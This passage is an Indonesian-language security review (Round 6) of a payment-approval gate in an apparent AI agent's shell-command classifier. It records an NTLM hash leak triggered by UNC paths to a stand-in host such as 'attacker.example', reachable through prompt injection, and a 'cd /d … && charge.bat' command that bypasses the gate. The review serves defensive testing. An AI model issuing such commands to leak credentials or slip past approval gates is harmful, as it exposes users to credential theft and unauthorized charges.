@@ -254,3 +254,58 @@ Probe `TestZZSec10R5*` (`cmd/damnbot` dengan `monetaryKey` Linux asli; `internal
 | SEC10-18 | MINOR | confirmed | Bila `EvalSymlinks` gagal (komponen akhir belum ada), kunci memakai path tanpa resolusi, sehingga path baru di bawah parent symlink ke skill tidak tergate. Risikonya rendah (file belum ada; tulis lewat link tetap ask). | Resolve parent terpanjang yang ada (berlaku juga untuk Windows di SEC10-14). |
 
 **Ringkasan Round 5:** #212 `b6172bb` **REQUEST CHANGES**. Perbaikan CI-nya benar dan tidak fail-open di Linux/darwin. Kunci kanonik me-resolve symlink, `/private/var`, case, dan 8.3. Prefix `kd + "/"` menolak sibling. ADS tetap tergate. `Canonicalize` nil tidak terjangkau di produksi. Namun di Windows, junction (dapat dibuat tanpa admin) tidak di-resolve oleh `EvalSymlinks` Go ≥ 1.23, sehingga path workspace yang mengarah ke skill pembayaran dapat di-auto-approve (SEC10-14). Perbaikannya terlokalisasi di `pathkey_windows.go` (`GetFinalPathNameByHandle`). SEC10-15..18 MINOR. Hasil CI mac/win pada head ini tetap verifikasi utama untuk jalur darwin/Windows.
+
+## Round 6 — 2026-10-22
+
+**Verdict:**
+
+| PR | Head | Verdict |
+|---|---|---|
+| #212 payment gate | `a3ace00` (rebase ke `2022f89`) | **REQUEST CHANGES**: SEC10-14/16/17/18 fixed; SEC10-15 sebagian. Dua temuan baru: **SEC10-19 (HIGH, regresi round ini)** akses jaringan/NTLM saat klasifikasi path UNC, dan **SEC10-20 (HIGH)** `cd /d <skill> && charge.bat` di-auto-approve di dialek `Cmd`. Test Windows CI pada head ini **gagal** dan kegagalannya membuktikan SEC10-20 |
+
+Rebase: diff Go `92a4e58..b6172bb` identik dengan `2022f89..eaf8ebb` (diperiksa dengan `diff` atas hunk `*.go`). Hanya `a3ace00` yang baru.
+
+**CI pada head ini** (run `39723276535`): ubuntu **pass**, macOS **pass** (termasuk `TestMonetaryKeyNFC`), Windows **FAIL**:
+- `TestPaymentSkillGateWired` (`skills_wire_test.go:149`): tool result `"[exit 0 · … · status exited]"`. Perintah `cd <stripe-pay>\scripts; ./charge.sh` **di-auto-approve dan dieksekusi** pada headless `--approval auto --unsafe-auto-shell`. Marker tidak dibuat hanya karena `.sh` tidak berjalan di cmd. Ini kegagalan gate yang nyata, bukan flake.
+- `TestPaymentGateResolvedTarget` (`:186`): `reads outside workspace: C:UsersRUNNER~1AppData…`. Ini **bug test**: `classify.Env` tanpa `Dialect` (default `Bash`), sehingga backslash dibaca sebagai escape. Perbaikannya `Dialect: runtimeDialect()`.
+- `TestMonetaryKeyJunction` tidak masuk daftar gagal, tetapi log non-verbose tidak menunjukkan apakah test itu lulus atau di-skip (`mklink /J unavailable`). Perlu `-run TestMonetaryKeyJunction -v` di CI.
+
+Gate lokal di `a3ace00`: `go test -race -tags goolm -count=1 ./internal/exec/classify ./internal/tools ./internal/skills/... ./internal/archtest` → ok; `./cmd/damnbot -run 'Skill|Payment|Monetary|PathKey|Canon|Key'` → ok; `go vet ./...` + `GOOS=windows|darwin` bersih; `GOOS=windows|darwin go test -c ./cmd/damnbot` ok; `make deadcode` 0; `make loc` **`exec/classify 1800/1800`**, `tools 2168/2200`.
+
+Probe `TestZZSec10R6`/`TestZZR6Cmd` dihapus setelah dijalankan.
+
+| Probe | Hasil |
+|---|---|
+| `existingPrefix` untuk `/`, `""`, `.`, `rel/a/b`, `//`, `/../..`, `/nonexistent/a/b/c` | semua berhenti. Base `/` atau cwd, sisa path dipertahankan |
+| 2.000 komponen yang tidak ada | 73 ms (biaya per iterasi = komponen yang ada + 1, karena `EvalSymlinks` gagal di komponen pertama yang hilang) |
+| `linkdir/scripts/new.py` (belum ada, parent symlink) | `python3`: **monetary**; `cp x …/new.py`: **monetary** ✔ SEC10-18 |
+| sibling `stripe-pay-v2` | mutating ✔ |
+| `Cmd` + kunci simulasi: `python \\?\C:\…\charge.py`, `\\.\…`, `"\\?\…"` | **monetary** ✔ (hook operand baru, `cleanDevicePrefix`) SEC10-15 |
+| `Cmd`: `type \\attacker.example\share\x.txt` | `MonetaryKey` menerima **`\\attacker.example\share\x.txt` mentah** → SEC10-19 |
+| `Cmd`: `cd /d <stripe-pay>\scripts && charge.bat` | **mutating, unsafe-headless `A`** → SEC10-20 |
+| `Cmd`: `cd <stripe-pay>\scripts; ./charge.sh` (persis perintah test CI) | **mutating, `A`, tanpa reason** → SEC10-20 |
+| `Cmd`: `cd <stripe-pay>\scripts & charge.bat`, `cd <dir>`, `<dir>\charge.bat` | monetary, `D` ✔ |
+
+### Jawaban per pertanyaan
+
+- **`GetFinalPathNameByHandle` + `BACKUP_SEMANTICS`: blok / jaringan / DoS?** Untuk path lokal: `CreateFile` dengan akses 0 dan share penuh tidak bertabrakan dengan lock atau oplock pembuka lain, dan `BACKUP_SEMANTICS` hanya diperlukan untuk membuka direktori (tanpa privilege bila akses 0). Prefiks `\\.\pipe\…` dilepas menjadi path relatif, sehingga pipe tidak dibuka. **Namun untuk path jaringan, ya.** `existingPrefix` (`EvalSymlinks` → `Lstat`) dan `finalPath` (`CreateFile`) menyentuh **UNC** (`\\host\share\…`, termasuk `\\?\UNC\…` setelah strip) dan drive jaringan yang di-map. Hook operand baru di `classify.operand` meneruskan string `\\…` mentah ke `MonetaryKey`, sehingga **klasifikasi, sebelum approval apa pun dan juga di headless,** membuka koneksi SMB ke host pilihan perintah. Akibatnya: (1) blocking sampai timeout SMB/WebDAV, dengan beberapa kali `Lstat` per path karena loop naik ke parent (DoS per tool call); (2) Windows mengirim autentikasi NTLM pengguna ke host tersebut (pencurian/relay hash). Di Round 5 bentuk UNC dirusak menjadi `C:\host\…` lokal, jadi ini **regresi Round 6** (SEC10-19).
+- **Loop `existingPrefix` berhenti di root/UNC?** Ya. Berhenti ketika `filepath.Dir(abs) == abs`: `/`, `C:\`, `\\srv\share\` (volume UNC + separator), dan `.` untuk path relatif bila `Abs` gagal. Terverifikasi untuk bentuk POSIX. Bentuk Windows dinilai statis dari `filepathlite.volumeNameLen`.
+- **Perubahan `classify` minimal?** Ya: 3 baris hook operand `\\` + satu `if` yang dipadatkan (`1800/1800`, tanpa sisa ruang). Hook ini benar untuk device prefix tetapi menjadi sumber SEC10-19. Perbaikan SEC10-20 di `classify` akan butuh ruang `loc.budget`.
+- **NewShell (SEC10-17):** satu-satunya pemanggil produksi (`run.go`) menangani error; `MonetaryPaths` tanpa `Canonicalize` → error ✔.
+- **darwin NFC (SEC10-16):** NFC pada input dan output `canonicalBase`, lalu lowercase; `golang.org/x/text` sudah menjadi dependency. CI macOS lulus ✔.
+- **Junction/subst (SEC10-14):** `CreateFile` tanpa `OPEN_REPARSE_POINT` mengikuti junction/symlink; `GetFinalPathNameByHandle(flags 0 = NORMALIZED|VOLUME_NAME_DOS)` mengembalikan path volume nyata (subst → drive asli, 8.3 → nama panjang), lalu `\\?\` dilepas. Benar secara statis. Bukti CI untuk `TestMonetaryKeyJunction` belum terlihat (lihat di atas).
+
+### Temuan
+
+| ID | Severity | Status | Temuan | Perbaikan |
+|---|---|---|---|---|
+| SEC10-14 | MEDIUM | **fixed (static)** `a3ace00` | `finalPath` via `GetFinalPathNameByHandle`. | Pastikan `TestMonetaryKeyJunction` benar-benar berjalan (bukan skip) di CI Windows. |
+| SEC10-15 | MINOR | **partial** | `\\?\`/`\\.\` kini monetary untuk operand. `\\localhost\C$` tetap menjadi residual yang terdokumentasi. | Lihat SEC10-19: jangan resolve UNC lewat filesystem. |
+| SEC10-16 | MINOR | **fixed** `a3ace00` | NFC + lowercase (CI macOS lulus). | — |
+| SEC10-17 | MINOR | **fixed** `a3ace00` | `NewShell` → error. | — |
+| SEC10-18 | MINOR | **fixed** `a3ace00` | `existingPrefix` (probe). | — |
+| SEC10-19 | **HIGH** | static + simulasi (regresi Round 6) | **Klasifikasi menyentuh jaringan.** Operand UNC (`\\host\share\…`, `\\?\UNC\…`) diteruskan mentah ke `MonetaryKey`, lalu `existingPrefix`/`EvalSymlinks` dan `finalPath`/`CreateFile` membuka SMB/WebDAV ke host tersebut sebelum approval, juga di headless. Akibatnya kebocoran autentikasi NTLM ke host penyerang (cukup prompt-injection yang membuat model menulis `type \\evil\s\x`) dan blocking sampai timeout jaringan. | Windows `monetaryKey`: bila path (setelah strip prefix) adalah UNC atau volume-nya `GetDriveType == DRIVE_REMOTE`, **jangan** panggil API filesystem. Kembalikan kunci leksikal (lowercase, slash), dan untuk operand UNC naikkan `Unknown` (fail-closed: tidak pernah auto). Tambahkan test: operand `\\192.0.2.1\s\x` diklasifikasikan < 50 ms tanpa I/O. |
+| SEC10-20 | **HIGH** | **confirmed (CI Windows + simulasi `Cmd`)** | **Dialek `Cmd`: `cd` ke skill pembayaran tidak di-gate.** `cd /d <skill>\scripts && charge.bat` → `mutating`, unsafe-headless **auto** (simulasi). `cd <skill>\scripts; ./charge.sh` → `mutating`, auto. CI Windows menjalankan perintah ini (`exit 0`). Flag `/d` dan pemisah `;` cmd tidak dipahami, sehingga target `cd` tidak dicek terhadap gate, dan argv0 relatif sesudah `cd` tidak dinaikkan ke `Unknown` seperti di bash (SEC10-1). Bentuk `cd <dir> & charge.bat` sudah benar. | Lexer `Cmd`: dukung `cd /d`/`chdir /d`/`pushd`, perlakukan target cd sebagai operand gate, dan perlakukan argumen cd yang tidak dapat diurai sebagai `Unknown`. Terapkan aturan "argv0 relatif sesudah `cd` → `Unknown`" di `Cmd`/`Pwsh`. Pertahankan test E2E Windows (`TestPaymentSkillGateWired`) dengan skrip `.bat` agar marker benar-benar diuji. |
+| SEC10-21 | MINOR | confirmed (CI) | `TestPaymentGateResolvedTarget` tidak menyetel `Dialect`, sehingga di Windows path dibaca dengan aturan escape bash. | `Dialect: runtimeDialect()`. |
+
+**Ringkasan Round 6:** #212 `a3ace00` **REQUEST CHANGES**. Perbaikan SEC10-14/16/17/18 benar: CI macOS dan ubuntu lulus, loop prefix berhenti, dan `NewShell` fail-closed. Namun CI Windows **gagal**, dan kegagalan E2E-nya adalah bypass gate yang nyata di dialek `Cmd` (SEC10-20). Selain itu, hook operand baru membuat klasifikasi membuka koneksi SMB ke host UNC pilihan perintah sebelum approval (SEC10-19, kebocoran NTLM + DoS). Keduanya harus ditutup, dengan CI Windows hijau termasuk test junction yang benar-benar berjalan, sebelum merge. `exec/classify` sudah 1800/1800, sehingga perbaikan butuh ruang `loc.budget`.
